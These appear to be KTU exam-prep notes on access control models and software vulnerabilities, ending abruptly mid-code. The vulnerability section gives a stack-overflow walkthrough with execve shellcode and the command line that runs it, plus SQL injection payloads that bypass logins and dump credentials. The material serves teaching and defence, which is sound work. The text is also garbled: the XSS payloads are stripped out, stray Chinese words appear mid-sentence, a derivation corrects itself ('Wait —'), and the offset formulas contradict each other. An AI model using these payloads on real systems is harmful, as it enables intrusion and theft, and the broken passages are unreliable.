# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A — Short Answer Questions (3 Marks Each)

> [!NOTE]
> KTU 2024 Part A questions test *Remember* and *Understand* levels of Bloom's Taxonomy. Answers should be concise, 3–4 sentences, with proper definitions.

---

### **Question 1 (3 Marks)** `[KTU University Exam - May 2023]`

**Define Access Control. Explain the difference between identification, authentication, and authorization.**

#### Model Answer:

Access Control is a security mechanism that regulates *who* can do *what* to *which* resources under specific conditions, based on a predefined security policy.

- **Identification** is the process by which a user *claims* an identity, e.g., entering a username.
- **Authentication** is the process of *verifying* that claimed identity using credentials like passwords, biometrics, or tokens.
- **Authorization** is the process of *granting* or *denying* access rights to the authenticated user, based on the access control policy.

**The sequence is Identification → Authentication → Authorization.** A user must first identify, then be authenticated, before they can be authorized to access any resource.

---

### **Question 2 (3 Marks)** `[KTU University Exam - Dec 2022]`

**Differentiate between Discretionary Access Control (DAC) and Mandatory Access Control (MAC).**

#### Model Answer:

| Parameter | **DAC** | **MAC** |
|-----------|---------|---------|
| **Policy Authority** | Resource owner decides | Central administrator decides |
| **Basis of Decision** | User identity | Security labels/clearances |
| **Flexibility** | High | Low |
| **Strength** | Flexible but Trojan-vulnerable | Strict, resists covert channels |
| **Example** | Unix `chmod` | SELinux, Trusted Solaris |

In DAC, the *owner* of a file decides who can access it (e.g., Unix file permissions). In MAC, a *central security officer* assigns sensitivity labels to subjects and objects, and the system *enforces* a lattice-based policy (e.g., Bell-LaPadula). The key difference is that in DAC, the owner has discretion; in MAC, the policy is mandatory and cannot be overridden by the owner.

---

## 5.2 Part B — Long Answer Questions (14 Marks Each)

> [!NOTE]
> KTU 2024 Part B questions are evaluated for 14 marks with **internal choice** between two sub-questions, usually part (a) for **7 marks** and part (b) for **7 marks**. The model answers below are aligned with the **2024 Scheme Bloom's Level: Apply / Analyze / Evaluate**.

---

### **Question A (14 Marks)** `[KTU University Exam - Dec 2023]`

**A system has four subjects $S_1, S_2, S_3, S_4$ and four objects $F_1, F_2, F_3, F_4$. The Access Control Matrix is given below:**

| | $F_1$ | $F_2$ | $F_3$ | $F_4$ |
|---|---|---|---|---|
| **$S_1$** | Own, R, W | R | — | W |
| **$S_2$** | R | Own, R, W | R | — |
| **$S_3$** | R | R | Own, R, W | R |
| **$S_4$** | — | R | R | Own, R, W |

#### (a) Construct the Access Control List (ACL) for each object. (7 Marks)
#### (b) Construct the Capability List (C-List) for each subject and explain which is more efficient for revoking access of $S_2$ to $F_1$. (7 Marks)

---

#### Model Solution:

### Part (a) — Access Control Lists (7 Marks)

An ACL stores access rights *per object* (column-wise). For each object, list the subjects and their rights.

**ACL for $F_1$:**

$$\text{ACL}(F_1) = \{ (S_1, \{\text{Own, R, W}\}), (S_2, \{\text{R}\}), (S_3, \{\text{R}\}), (S_4, \emptyset) \}$$

**ACL for $F_2$:**

$$\text{ACL}(F_2) = \{ (S_1, \{\text{R}\}), (S_2, \{\text{Own, R, W}\}), (S_3, \{\text{R}\}), (S_4, \{\text{R}\}) \}$$

**ACL for $F_3$:**

$$\text{ACL}(F_3) = \{ (S_1, \emptyset), (S_2, \{\text{R}\}), (S_3, \{\text{Own, R, W}\}), (S_4, \{\text{R}\}) \}$$

**ACL for $F_4$:**

$$\text{ACL}(F_4) = \{ (S_1, \{\text{W}\}), (S_2, \emptyset), (S_3, \{\text{R}\}), (S_4, \{\text{Own, R, W}\}) \}$$

Each ACL specifies which subjects can access the object and the corresponding rights.

---

### Part (b) — Capability Lists and Revocation Analysis (7 Marks)

A C-List stores access rights *per subject* (row-wise). For each subject, list the objects and their rights.

**C-List for $S_1$:**

$$\text{Cap}(S_1) = \{ (F_1, \{\text{Own, R, W}\}), (F_2, \{\text{R}\}), (F_3, \emptyset), (F_4, \{\text{W}\}) \}$$

**C-List for $S_2$:**

$$\text{Cap}(S_2) = \{ (F_1, \{\text{R}\}), (F_2, \{\text{Own, R, W}\}), (F_3, \{\text{R}\}), (F_4, \emptyset) \}$$

**C-List for $S_3$:**

$$\text{Cap}(S_3) = \{ (F_1, \{\text{R}\}), (F_2, \{\text{R}\}), (F_3, \{\text{Own, R, W}\}), (F_4, \{\text{R}\}) \}$$

**C-List for $S_4$:**

$$\text{Cap}(S_4) = \{ (F_1, \emptyset), (F_2, \{\text{R}\}), (F_3, \{\text{R}\}), (F_4, \{\text{Own, R, W}\}) \}$$

**Revocation Efficiency Analysis:**

To revoke $S_2$'s access to $F_1$:

- **Using ACL:** Open $\text{ACL}(F_1)$ and delete the entry $(S_2, \{\text{R}\})$. This is a **single-step, immediate** operation.
- **Using Capability:** Must find $S_2$ in the system, then delete the entry $(F_1, \{\text{R}\})$ from $\text{Cap}(S_2)$. If capabilities are *propagated* or *copied*, revoking is more difficult because copies may exist in other subjects' lists.

> Therefore, **ACL is more efficient for revocation** because the rights are stored centrally *with the object*, allowing immediate modification. The C-List approach is more efficient for *answering* "what can user $S_2$ do?" since all of $S_2$'s permissions are in one place.

> [!WARNING]
> **KTU Examiner's Pitfall — Marks Deduction Alert:** Students often (i) forget to include the **Own** right when an entry says "Own, R, W"; (ii) miss the empty set $\emptyset$ for subjects with no access (do not write "null" or skip — use $\emptyset$); (iii) confuse ACL with C-List directions. **Marks lost for these mistakes: 1–2 per error.**

---

### **Question B (14 Marks)** `[KTU University Exam - May 2024]`

**(a) Explain the Bell-LaPadula (BLP) Model with its three security properties. Illustrate the working of BLP with a suitable example involving at least 4 subjects and 4 objects. (7 Marks)**

**(b) Explain Role-Based Access Control (RBAC) with reference to the NIST standard. Discuss the various RBAC levels and the importance of Separation of Duties (SoD). (7 Marks)**

---

#### Model Solution:

### Part (a) — Bell-LaPadula Model (7 Marks)

**Introduction:** The Bell-LaPadula (BLP) Model, proposed by David Bell and Leonard LaPadula in **1973** for the U.S. Department of Defense, is a formal **state-transition** model of access control designed to enforce **confidentiality** in military and government systems.

**Three Security Properties of BLP:**

1. **Simple Security Property (No Read Up, NRU):** A subject $s$ at security level $L(s)$ can read an object $o$ at level $L(o)$ **only if** $L(s) \ge L(o)$. This prevents a low-clearance subject from reading high-classification data.

$$L(s) \ge L(o) \implies \text{Read Allowed}$$

2. **★-Property (Star Property, No Write Down, NWD):** A subject $s$ at level $L(s)$ can write to an object $o$ at level $L(o)$ **only if** $L(s) \le L(o)$. This prevents a high-clearance subject from writing sensitive data to a low-classification object, where it could be read by unauthorized users.

$$L(s) \le L(o) \implies \text{Write Allowed}$$

3. **Tranquility Property:** Security labels do not change while the system is active (Strong Tranquility), or they can change but only in a way that does not violate the other properties (Weak Tranquility).

**Worked Example:**

Consider four security labels: $\text{Top Secret (TS)} \gt \text{Secret (S)} \gt \text{Confidential (C)} \gt \text{Unclassified (U)}$.

- **Subjects:** 
  - $S_1$ (level = TS, e.g., a Defense Minister)
  - $S_2$ (level = S, e.g., a Military Officer)
  - $S_3$ (level = C, e.g., a Defense Analyst)
  - $S_4$ (level = U, e.g., a Civilian Clerk)
- **Objects:** 
  - $O_1$ (file containing nuclear codes, level = TS)
  - $O_2$ (file containing troop movements, level = S)
  - $O_3$ (file containing training schedules, level = C)
  - $O_4$ (file containing cafeteria menu, level = U)

**Apply BLP Rules:**

- $S_1$ (TS) can read $O_1, O_2, O_3, O_4$ (all lower levels) ✓, and can write *only* to $O_1$ (same level).
- $S_2$ (S) can read $O_2, O_3, O_4$ (lower levels) ✓, but NOT $O_1$ (higher) ✗. Can write to $O_1, O_2$ ✓.
- $S_3$ (C) can read $O_3, O_4$ ✓, but NOT $O_1, O_2$ ✗. Can write to $O_1, O_2, O_3$ ✓.
- $S_4$ (U) can read only $O_4$ ✓, and can write to all $O_1, O_2, O_3, O_4$ ✓.

**Significance:** The BLP model mathematically guarantees **confidentiality** by preventing information flow from higher to lower levels, eliminating *covert channels* of data leakage.

---

### Part (b) — Role-Based Access Control and NIST Levels (7 Marks)

**Introduction:** RBAC, formalized by Ferraiolo and Kuhn in **1992** and standardized by **NIST as INCITS 359 in 2001**, is the most widely used access control model in modern enterprise systems. It addresses the limitations of DAC and MAC by introducing the concept of *roles* as an intermediary between users and permissions.

**Core Concept:**

$$\text{Users} \longleftrightarrow \text{Roles} \longleftrightarrow \text{Permissions}$$

A user does not directly receive permissions. Instead, the user is assigned a *role*, and the role bundles multiple permissions. This indirection makes policy management highly scalable.

**RBAC₀ — Flat RBAC (Base Model):**
Defines the minimum requirements:
- $U$ = Users, $R$ = Roles, $P$ = Permissions
- $UA \subseteq U \times R$ (User-Role assignment)
- $PA \subseteq P \times R$ (Permission-Role assignment)

**RBAC₁ — Hierarchical RBAC:**
Adds role hierarchy: $RH \subseteq R \times R$, a partial order. Senior roles inherit permissions from junior roles.

$$\text{If } r_1 \ge r_2, \text{ then } PA^*(r_1) \supseteq PA(r_2)$$

**RBAC₂ — Constrained RBAC:**
Adds Separation of Duties (SoD) constraints:
- **Static SoD (SSD):** Mutually exclusive roles cannot be assigned to the same user at the *same time*.
- **Dynamic SoD (DSD):** Conflicting roles can be assigned to a user, but cannot be **active simultaneously** in a single session.

**RBAC₃ — Symmetric (Consolidated) RBAC:**
Combines RBAC₁ (hierarchy) and RBAC₂ (constraints) to provide a full-featured, flexible model.

**Importance of Separation of Duties:**

SoD is a critical organizational control that prevents **fraud** and **collusion**. By ensuring that no single user has complete control over a critical transaction, SoD enforces:

1. **Two-Person Integrity:** Sensitive actions require multiple users.
2. **Fraud Prevention:** A person who initiates a transaction cannot also approve it.
3. **Audit Compliance:** Aligns with SOX, HIPAA, Basel III regulatory requirements.

**Example:** In a banking system, the role *Cashier* (enters deposits) and *Auditor* (verifies them) are mutually exclusive. The SSD constraint $(rs=\{\text{Cashier, Auditor}\}, n=2)$ ensures no single user can hold both.

> [!WARNING]
> **KTU Examiner's Pitfall — Common Mark Deductions:**
> 1. **Confusing BLP and Biba** — BLP is for *confidentiality* (No Read Up); Biba is for *integrity* (No Read Down). Mixing these causes **2-mark deduction**.
> 2. **Forgetting to name the levels** in NIST RBAC — RBAC0/1/2/3 must be *named and described* to score full marks.
> 3. **Writing "DSD and SSD are the same"** — They are different: SSD is checked at *assignment* time, DSD is checked at *session activation* time. This distinction is worth **2–3 marks**.
> 4. **Not using the term "lattice"** in MAC — the label hierarchy must be a *partially ordered set* to score 7-mark questions on Bell-LaPadula.

---

## 5.3 Topic Recap & Important Things to Remember

> [!TIP]
> **Last-Minute KTU Revision Checklist — Module 1 Access Control Mechanisms**

### 📘 Core Definitions (Must Memorize Verbatim)
- **Access Control** → Selective restriction of access to resources based on policy.
- **Subject** → Active entity (user/process) requesting access.
- **Object** → Passive entity (file/resource) being accessed.
- **Access Matrix** → Subjects × Objects table; each cell is a set of rights.
- **ACL** → Column-wise storage (per-object).
- **Capability List** → Row-wise storage (per-subject).
- **Reference Monitor** → Tamper-proof, complete, verifiable mediator (Anderson 1972).
- **DAC** → Owner-controlled; flexible; Trojan-vulnerable.
- **MAC** → System-controlled; label-based; BLP / Biba / Clark-Wilson.
- **RBAC** → Role-mediated; NIST standard; supports SoD.

### 🔑 Key Theorems & Properties
- **Bell-LaPadula Simple Security (NRU):** $L(s) \ge L(o) \implies$ Read OK.
- **Bell-LaPadula ★-Property (NWD):** $L(s) \le L(o) \implies$ Write OK.
- **Biba NRD:** $I(s) \le I(o) \implies$ Read OK.
- **Biba NWU:** $I(s) \ge I(o) \implies$ Write OK.
- **HRU Safety Theorem (1976):** Safety is **undecidable** in the general HRU model.
- **Take-Grant Model:** A tractable alternative to HRU for safety analysis.

### 🛠️ NIST RBAC Levels (Hierarchy)
- **RBAC₀** → Base: Users ↔ Roles ↔ Permissions.
- **RBAC₁** → + Role Hierarchy (inheritance).
- **RBAC₂** → + Constraints (SSD, DSD).
- **RBAC₃** → RBAC₁ + RBAC₂ (Symmetric).

### 🌍 Real-World Implementations
- **Linux/Unix `chmod` / `chown`** → DAC.
- **SELinux / AppArmor / Trusted Solaris** → MAC.
- **AWS IAM, Azure RBAC, Windows DACLs** → RBAC.
- **Oracle VPD, SQL Server RLS** → MAC + RBAC hybrid.

### ⚖️ Comparison Shortcut
- **DAC** = "Owner decides" (Unix).
- **MAC** = "System decides" (Military).
- **RBAC** = "Role decides" (Enterprise).
- **Rule of thumb:** DAC < MAC < RBAC in scalability; DAC < RBAC < MAC in security strictness.

### ❌ Frequently Confused Pairs
- **NRU vs NRD** — NRU is BLP (confidentiality); NRD is Biba (integrity).
- **ACL vs Capability** — ACL = column, Capability = row.
- **Identification vs Authentication** — Claim vs Proof.
- **RBAC₁ vs RBAC₂** — Hierarchy vs Constraints.
- **SSD vs DSD** — Static (at assignment) vs Dynamic (at session).

### 🎯 KTU 2024 High-Yield Traps
- Trojan Horse attacks primarily compromise **DAC** (not MAC).
- The ★-Property prevents **covert channels** (not just illegal reads).
- In RBAC, **role explosion** is a real-world challenge — too many roles defeats the purpose.
- The Reference Monitor is **abstract**, not a physical component.
- **OS as a Trusted Subject** has universal control to enforce policy in DAC.
- **Confused Deputy Problem** is a DAC vulnerability but not unique to DAC.

> [!IMPORTANT]
> **Final KTU Exam Day Tip:** If you are unsure whether a question is asking about *confidentiality* or *integrity*, look for keywords: "leakage," "disclosure," "read" → **BLP**; "corruption," "modification," "trust" → **Biba**. This single heuristic will help you choose the correct model in long-answer questions.

<!-- SECTION_5_END -->

topics.title: Software Vulnerabilities - Buffer and Stack Overflow, Cross-site Scripting (XSS) and Vulnerabilities, SQL Injection and Vulnerabilities, Phishing
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PECST744 - INFORMATION SECURITY > - **Module:** Module 2 > - **Topic:** Software Vulnerabilities - Buffer and Stack Overflow, Cross-site Scripting (XSS) and Vulnerabilities, SQL Injection and Vulnerabilities, Phishing ## 1. Core Technical Definition & Intuitive Overview ### 1.1 Software Vulnerabilities — The Foundational Definition > [!IMPORTANT] > **Software Vulnerability (KTU 2024 Definition):** A software vulnerability is a weakness, flaw, or error存在于软件系统 (present within a software system) that can be exploited by a threat actor to compromise the **Confidentiality, Integrity, or Availability (CIA Triad)** of the system. Vulnerabilities arise from design flaws, coding errors, or improper configuration. In the **KTU 2024 Outcome-Based Education (OBE) framework**, software vulnerabilities are classified under **Course Outcome CO2**: *"Identify and analyze software vulnerabilities and apply appropriate mitigation strategies."* --- ### 1.2 The Four Major Software Vulnerability Classes (Module 2 Scope) | # | Vulnerability Class | Layer of Attack | Primary CIA Triad Impact | |---|---|---|---| | 1 | **Buffer & Stack Overflow** | System / Memory Layer | Integrity & Availability | | 2 | **Cross-site Scripting (XSS)** | Application Layer (Client-side) | Confidentiality & Integrity | | 3 | **SQL Injection (SQLi)** | Application Layer (Server-side DB) | Confidentiality & Integrity | | 4 | **Phishing** | Human / Social Layer | Confidentiality | --- ### 1.3 Conceptual Analogies — Plain English Intuition > [!NOTE] > **Analogy 1 — Buffer Overflow as a "Parking Garage Crash":** > Imagine a parking garage with exactly **10 parking slots (the buffer)**. A valet (the program) tries to park **15 cars (the input)**. The extra 5 cars don't simply "disappear" — they crash into the adjacent wall (the **return address**) and roll out into the street (the **attacker's code**). A *buffer overflow* is exactly this: writing more data than allocated memory can hold, which then corrupts adjacent memory structures. > [!NOTE] > **Analogy 2 — SQL Injection as a "Vulnerable Bouncer":** > A nightclub bouncer (the login form) asks: *"What is your name?"* You reply: `Alice; DROP TABLE Guests; --`. The bouncer, being a poorly-programmed script, executes your entire sentence as a database command — **deleting every guest on the list**. SQL injection exploits the fact that user input is concatenated directly into database queries without sanitization. > [!NOTE] > **Analogy 3 — XSS as "Graffiti on a Community Notice Board":** > A public notice board (the website) allows anyone to pin a note (the comment). A malicious user pins a note containing **active JavaScript** disguised as harmless text. When other users view the board, the script executes in their browsers, stealing their cookies. XSS is exactly this — injecting executable client-side code into trusted web pages. > [!NOTE] > **Analogy 4 — Phishing as a "Con-Artist Disguised as Your Bank Manager":** > A scammer calls you pretending to be from your bank, knows your name (leaked from a data breach), and asks for your **OTP** to "verify your account." *Phishing* is a social-engineering attack where the attacker impersonates a trusted entity to steal credentials, financial data, or install malware. --- ### 1.4 Formal Definitions Aligned to KTU Syllabus **Buffer Overflow:** A condition where a program writes data beyond the boundaries of a fixed-length buffer (an allocated contiguous memory block), overwriting adjacent memory locations such as local variables, the **Saved Frame Pointer (SFP)**, and the **Return Address** on the call stack. **Cross-site Scripting (XSS):** A client-side code injection attack in which malicious scripts are injected into trusted websites and executed in the victim's browser within the **same-origin policy** context. **SQL Injection (SQLi):** A code injection technique that exploits security vulnerabilities in an application's database layer by inserting malicious SQL statements into an input field that is later passed to the backend database for execution. **Phishing:** A social engineering attack that uses disguised email, SMS, voice, or web communication as a weapon to trick recipients into revealing personal information, credentials, or installing malware. > [!IMPORTANT] > **KTU 2024 High-Yield Insight:** The first three vulnerabilities are *technical* (exploiting code flaws), while phishing is a *human* vulnerability (exploiting psychology). This distinction is a **favourite KTU question pattern** — expect 3–5 mark questions comparing them. ## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet ### 2.1 Buffer Overflow — Deep Theory #### 2.1.1 The Process Memory Layout (The Attack Surface) Every C/C++ program at runtime is divided into **four logical segments** in virtual memory: ``` HIGH ADDRESS (0xFFFFFFFF on 32-bit) ┌─────────────────────┐ │ STACK │ ← Grows DOWNWARD │ (local vars, RA) │ ├─────────────────────┤ │ ↓ │ │ (free) │ │ ↑ │ ├─────────────────────┤ │ HEAP │ ← Grows UPWARD │ (dynamic malloc) │ ├─────────────────────┤ │ BSS (uninit data) │ ├─────────────────────┤ │ DATA (init data) │ ├─────────────────────┤ │ TEXT (code) │ └─────────────────────┘ LOW ADDRESS (0x00000000) ``` > [!IMPORTANT] > **KTU Board Exam Favourite:** The *stack* grows toward **lower** memory addresses (from high to low), while the *heap* grows toward **higher** addresses. This is a **guaranteed 2–3 mark short-answer question** in KTU exams. #### 2.1.2 Anatomy of a Stack Frame When a function is called, a **stack frame (activation record)** is pushed onto the stack. The critical components are: | Offset from Top | Component | Purpose | |---|---|---| | Highest address | **Function Arguments** | Parameters passed to the function | | ↓ | **Return Address** | Where execution resumes after the function returns | | ↓ | **Saved Frame Pointer (SBP/EBP)** | Pointer to the previous stack frame | | ↓ | **Local Buffer / Variables** | The buffer where user input is stored | | Lowest address | **Top of Stack (ESP)** | Current stack pointer | > [!WARNING] > **Attacker's Target:** The attacker wants to **overwrite the Return Address** with the address of their injected **shellcode**, redirecting program flow to attacker-controlled code. #### 2.1.3 Step-by-Step Stack Overflow Mechanism 1. **Allocate:** The vulnerable function declares a local buffer (e.g., `char buf[64]`) on the stack. 2. **Overflow:** A user-supplied input longer than 64 bytes (e.g., 80 bytes) is copied into `buf` using unsafe functions like `strcpy()`, `gets()`, or `sprintf()`. 3. **Corruption:** Excess bytes spill into the **SBP**, then the **Return Address**, then into the previous stack frame. 4. **Control Hijack:** When the function executes `RET`, the CPU pops the corrupted return address into the **Instruction Pointer (EIP/RIP)** and jumps to the attacker's address. 5. **Shellcode Execution:** At the attacker's chosen address, malicious **shellcode** (machine instructions) executes — often launching a root shell (e.g., `execve("/bin/sh")`). > [!NOTE] > **KTU Insight:** A classic **Aleph One's "Smashing the Stack for Fun and Profit"** (1996) attack is the canonical stack-smashing exploit. The paper introduced the concept of the **NOP Sled** — a long sequence of `0x90` (No-Operation) instructions placed before shellcode to widen the landing zone for the corrupted return address. #### 2.1.4 Heap Overflow (Brief but Important for KTU) A heap overflow corrupts **dynamically allocated memory** (e.g., via `malloc()`). The attack overwrites heap metadata or adjacent heap objects. Modern exploitation uses **Use-After-Free (UAF)** and **heap spraying** techniques. --- ### 2.2 Cross-Site Scripting (XSS) — Deep Theory #### 2.2.1 The Three XSS Variants | Variant | Storage Location | Trigger Mechanism | Severity | |---|---|---|---| | **Stored (Persistent) XSS** | Server database | Victim views a stored page (e.g., forum post) | **Critical** | | **Reflected (Non-Persistent) XSS** | URL query string | Victim clicks a crafted malicious link | **High** | | **DOM-Based XSS** | Client-side DOM | Malicious script modifies the DOM in-browser | **High** | #### 2.2.2 XSS Attack Vector Anatomy **Reflected XSS Attack Flow:** 1. Attacker crafts a malicious URL: `http://victim.com/search?q=` 2. Victim clicks the link (often via phishing email). 3. The server reflects the search query back into the HTML page *without sanitization*. 4. The browser executes the injected `` 2. The server stores the comment in the database. 3. Every user who views the infected page unknowingly executes the script. #### 2.2.3 Same-Origin Policy (SOP) — Why XSS Works > [!IMPORTANT] > **SOP Rule:** A script from `evil.com` **cannot** read the cookies of `bank.com`. However, a script that is **already running on bank.com** (injected via XSS) *can* access `bank.com` cookies. XSS bypasses SOP by making the malicious code *appear* to come from the trusted origin itself. --- ### 2.3 SQL Injection — Deep Theory #### 2.3.1 The Vulnerable Code Pattern A typical vulnerable authentication check in C/PHP/Java: ```sql SELECT * FROM users WHERE username = '$user' AND password = '$pass'; ``` If `$user = "admin' OR '1'='1"`, the query becomes: ```sql SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'; ``` The condition `'1'='1'` is **always true**, bypassing authentication. #### 2.3.2 SQL Injection Classification (KTU 2024 High-Yield) | Type | Description | Detection Method | |---|---|---| | **In-band SQLi** | Results visible in the application's response (Error-based, Union-based) | Direct data exfiltration | | **Blind SQLi (Boolean)** | App returns different responses for true/false conditions | Inference via `AND 1=1` / `AND 1=2` | | **Blind SQLi (Time-based)** | App delays response based on condition | `IF(1=1, SLEEP(5), 0)` in MySQL | | **Out-of-band SQLi** | Data exfiltrated via DNS/HTTP to attacker server | Used when in-band is blocked | #### 2.3.3 Union-Based SQLi Example ```sql ' UNION SELECT username, password FROM users -- ``` This appends a second query that returns usernames and passwords directly in the application's response page. --- ### 2.4 Phishing — Deep Theory #### 2.4.1 Phishing Attack Lifecycle 1. **Reconnaissance:** Attacker harvests email addresses (LinkedIn, data breaches like *Have I Been Pwned*). 2. **Weaponization:** Crafting a spoofed email with a malicious link or attachment. 3. **Delivery:** Sending mass emails via botnets (e.g., Emotet, Necurs). 4. **Exploitation:** Victim clicks → credential harvesting page or malware download. 5. **Installation:** Malware installs (e.g., keylogger, ransomware). 6. **Command & Control (C2):** Attacker receives stolen data. 7. **Actions on Objectives:** Account takeover, financial fraud, lateral movement. #### 2.4.2 Phishing Variants (KTU Must-Know) | Variant | Target | Channel | |---|---|---| | **Bulk Phishing** | Random users | Email | | **Spear Phishing** | Specific individual | Email with personal details | | **Whaling** | C-level executives (CEO, CFO) | Highly personalized email | | **Vishing** | Any user | Voice call (phone) | | **Smishing** | Any user | SMS | | **Pharming** | Any user | DNS poisoning redirecting to fake sites | --- ### 2.5 KTU High-Yield Formula Sheet & Key Metrics | Concept | Formula / Constant | Significance | |---|---|---| | Buffer Size | $N_{buffer} = \sum_{i=1}^{n} \text{sizeof}(var_i)$ bytes | Defines overflow threshold | | Return Address Offset | $\text{offset} = \text{sizeof}(buffer) + \text{sizeof}(SBP) + 8$ | Bytes to overwrite before return address (x86) | | Minimum Shellcode Size | $L_{shellcode} \leq N_{buffer}$ | Must fit inside buffer | | NOP Sled Coverage | $P_{hit} = \frac{L_{NOP}}{L_{NOP} + L_{shellcode}}$ | Probability of landing in NOP sled | | HTTP Response Code (Phishing) | **HTTP 200** with spoofed content | Server-side detection signature | | Shannon Entropy (DNS) | $H = -\sum_{i=1}^{n} p_i \log_2 p_i$ | Detects algorithmically generated phishing domains (DGA) | | Average Phishing Success Rate | **~0.1% to 0.3%** per campaign | Industry metric (Anti-Phishing Working Group) | | SQLi Tautology Truth Value | $'OR\ '1'='1$ | Always evaluates to TRUE | > [!NOTE] > **Critical Note on Markdown Tables:** In the formulas above, the vertical bar `\vert` is used to denote set/delimitation (e.g., $N_{buffer} = 2 \vert x \vert$) only as conceptual illustration; in the KTU exam, write expressions like $|x|$ cleanly on a single line or use `\vert x \vert` in LaTeX. --- ### 2.6 Mitigation Strategies — The Defensive Layer (CO2 & CO4 Mapping) | Vulnerability | Primary Mitigation | Defense-in-Depth | |---|---|---| | **Buffer Overflow** | Use safe functions (`strncpy`, `fgets`) | ASLR, DEP/NX bit, Stack canaries, CFI | | **XSS** | Output encoding (HTML, JS, URL contexts) | Content Security Policy (CSP), HttpOnly cookies | | **SQL Injection** | **Parameterized queries / Prepared statements** | Input validation, Least privilege DB user, WAF | | **Phishing** | User awareness training | Email filtering (SPF, DKIM, DMARC), MFA, FIDO2 keys | ## 3. Step-by-Step Derivations, Exploit Walkthroughs & Analytical Matrix ### 3.1 Stack Overflow Exploit — Exhaustive Step-by-Step Consider this **vulnerable C program** (classic KTU lab-style example): ```c #include #include void vulnerable_function(char *input) { char buffer[64]; // 64-byte local buffer strcpy(buffer, input); // UNSAFE — no bounds checking printf("You entered: %s\n", buffer); } int main(int argc, char *argv[]) { if (argc > 1) { vulnerable_function(argv[1]); } return 0; } ``` **Compiled with:** `gcc -fno-stack-protector -z execstack -m32 vulnerable.c -o vulnerable` (The flags disable stack canary and allow execution on the stack.) #### Step 1: Memory Layout Analysis The stack frame for `vulnerable_function` looks like this on a 32-bit x86 system: ``` HIGH MEMORY (toward 0xBFFFF000) ┌──────────────────────────┐ │ Function Argument: input │ 4 bytes (pointer) ├──────────────────────────┤ │ RETURN ADDRESS │ 4 bytes ← ATTACKER'S TARGET ├──────────────────────────┤ │ SAVED FRAME POINTER │ 4 bytes (SBP/EBP) ├──────────────────────────┤ │ │ │ buffer[64] │ 64 bytes │ │ ├──────────────────────────┤ │ (other locals, padding) │ LOW MEMORY ``` #### Step 2: Calculate the Return Address Offset The attacker must overwrite exactly: $$ \text{offset} = \text{sizeof}(buffer) + \text{sizeof}(SBP) + \text{sizeof}(\text{ret addr itself not counted, but we OVERWRITE it}) $$ Wait — we OVERWRITE the return address, so we send: - 64 bytes to fill the buffer - 4 bytes to overwrite the Saved Frame Pointer - 4 bytes to overwrite the Return Address $$ \text{Total padding} = 64 + 4 + 4 = 72 \text{ bytes} $$ But conventionally, the formula is: $$ \text{Padding} = \text{Buffer Size} + \text{Frame Pointer Size} = 64 + 4 = 68 \text{ bytes (before the return address bytes)} $$ #### Step 3: Construct the Malicious Payload The payload structure is: $$ \text{Payload} = \underbrace{[\text{'A'} \times 68]}_{\text{padding}} + \underbrace{[\text{4-byte shellcode address}]}_{\text{return address}} + \underbrace{[\text{NOP sled} + \text{shellcode}]}_{\text{attacker code (often placed via env vars)}} $$ #### Step 4: Detailed Step-by-Step Exploitation **Step 4.1: Generate the Pattern** We send 68 'A's (0x41) followed by a guessed address. In a controlled lab, the attacker first sends a unique cyclic pattern (e.g., from Metasploit's `pattern_create.rb`) and observes the crash address in a debugger (GDB) to determine the exact offset. **Step 4.2: Locate the Shellcode** Common technique: store the shellcode in an **environment variable** and predict its stack address. ```bash export SHELLCODE=$(python3 -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")') ``` Where: - `\x90` is the NOP sled (100 bytes) - The remaining bytes are x86 Linux `execve("/bin/sh")` shellcode **Step 4.3: Find the Return Address** ```bash ./getenvaddr SHELLCODE # Custom helper program ``` Output: `SHELLCODE is at 0xbffff3d0` **Step 4.4: Construct the Final Exploit** $$ \text{final\_payload} = \underbrace{[\text{'A'} \times 68]}_{68 \text{ bytes}} + \underbrace{[\text{0xbffff3d0 as little-endian: } \backslash xd0 \backslash xf3 \backslash xff \backslash xbf]}_{4 \text{ bytes, return address}} $$ **Step 4.5: Execute the Exploit** ```bash ./vulnerable $(python -c "import sys; sys.stdout.write('A'*68 + '\xd0\xf3\xff\xbf')") ``` **Step 4.6: Result Analysis** - The function `vulnerable_function` returns. - The CPU pops `0xbffff3d0` into EIP. - Execution jumps to the NOP sled. - The CPU slides through the NOPs and lands on the shellcode. - A root shell spawns (`/bin/sh`). > [!IMPORTANT] > **KTU Board Exam Tip:** When asked "Explain buffer overflow attack," students often skip the *return address overwrite* mechanics. Always mention: **strcpy overflow → SBP corruption → return address overwrite → EIP redirection → shellcode execution**. This 5-step chain is the mark-distribution key. --- ### 3.2 SQL Injection — Exhaustive Attack Walkthrough #### Scenario: A login form with URL `http://vulnsite.com/login` The backend PHP code is: ```php $user = $_POST['username']; $pass = $_POST['password']; $query = "SELECT * FROM users WHERE username = '$user' AND password = md5('$pass')"; $result = mysql_query($query); ``` #### Step 1: Test for Vulnerability The attacker enters in the username field: ``` ' OR 1=1 -- ``` The resulting query becomes: ```sql SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = md5('anything') ``` - The `--` comments out the rest of the query. - `1=1` is always TRUE. - The query returns **all users**, bypassing authentication. #### Step 2: Determine Number of Columns (UNION-based) ``` ' ORDER BY 1 -- ' ORDER BY 2 -- ' ORDER BY 3 -- ← If error, only 2 columns exist ``` #### Step 3: Extract Database Schema ``` ' UNION SELECT table_name, null FROM information_schema.tables -- ``` #### Step 4: Extract Column Names ``` ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' -- ``` #### Step 5: Dump Credentials ``` ' UNION SELECT username, password FROM users -- ``` > [!WARNING] > **Examiner's Pitfall:** Many KTU students forget to mention that the `--` (double-dash) is a SQL **comment** indicator. Always explicitly state that `--` comments out the trailing part of the original query, neutralizing the password check. #### Step 6: Mitigated Solution (Prepared Statement) ```php $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?"); $stmt->execute([$user, $pass]); ``` The `?` placeholders are **bound as data, not executable SQL code**, making injection impossible. --- ### 3.3 XSS — Exhaustive Attack Walkthrough #### Scenario: A search page that reflects the query URL: `http://vulnsite.com/search?q=` Server code: ```php

You searched for:

